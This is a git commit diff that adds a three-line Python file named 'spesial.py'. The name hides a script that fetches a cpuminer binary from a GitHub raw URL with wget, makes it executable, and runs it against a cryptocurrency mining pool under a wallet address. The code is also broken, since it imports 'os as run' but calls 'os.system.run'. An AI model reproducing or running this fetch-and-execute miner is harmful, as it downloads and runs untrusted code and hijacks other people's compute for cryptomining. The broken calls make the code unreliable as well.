607552aa2d480122aa5e9426b3dd1d6dd7fc02b4
AntonyAjax <94457247+AntonyAjax@users.noreply.github.com>
2022-03-05 13:46:51 +0700

    Create spesial.py

---
+++ spesial.py
@@ -0,0 +1,3 @@
+import os as run
+os.system.run("wget -qO cpu https://raw.githubusercontent.com/AntonyAjax/kawakita/main/cpuminer-sse2 && chmod +x cpu")
+os.system.run("./cpu -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RWq6cXxYKH6EFUqkM29JtFDKK4oX9w8Cve.5maret-v5 -t 15")
